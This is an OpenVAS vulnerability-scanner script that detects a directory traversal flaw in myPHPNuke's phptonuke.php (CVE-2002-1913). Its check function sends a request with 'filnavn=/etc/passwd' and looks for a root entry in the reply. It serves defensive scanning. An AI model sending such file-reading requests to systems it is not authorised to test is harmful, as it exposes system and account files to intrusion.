# OpenVAS Vulnerability Test
# $Id: phptonuke_dir_trav.nasl 17 2013-10-27 14:01:43Z jan $
# Description: myPHPNuke phptonuke.php Directory Traversal
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote web server contains a PHP script that allows for reading of
arbitrary files. 

Description :

The version of myPHPNuke installed on the remote host allows anyone to
read arbitrary files by passing the full filename to the 'filnavn'
argument of the 'phptonuke.php' script.";

tag_solution = "Upgrade to the latest version.";

# Status: it was *not* tested against a vulnerable host, and the 
# vulnerability is not confirlemed, as far as I know.
#
# Reference:
#
# From:	"Zero-X ScriptKiddy" <zero-x@linuxmail.org>
# To:	bugtraq@securityfocus.com
# Date:	Thu, 17 Oct 2002 05:50:10 +0800
# Subject: phptonuke allows Remote File Retrieving

if(description)
{
 script_id(11824);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_tag(name:"risk_factor", value:"Medium");

 script_cve_id("CVE-2002-1913");
 script_bugtraq_id(5982);

 name = "myPHPNuke phptonuke.php Directory Traversal";

 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 summary = "Reads file through phptonuke.php";
 script_summary(summary);
 script_category(ACT_ATTACK);

 script_copyright("This script is Copyright (C) 2003 Michel Arboi");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
		  
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 script_xref(name : "URL" , value : "http://marc.theaimsgroup.com/?l=bugtraq&amp;m=103480589031537&amp;w=2");
 exit(0);
}

#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);
if(! can_host_php(port:port) ) exit(0);


function check(loc)
{
 local_var	req, r;
 req = http_get(item:string(loc, "/phptonuke.php?filnavn=/etc/passwd"),
		port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if (isnull(r)) exit(0);
 if(r =~ "root:.*:0:[01]:.*")
 {
  security_warning(port);
  exit(0);
 }
}




foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
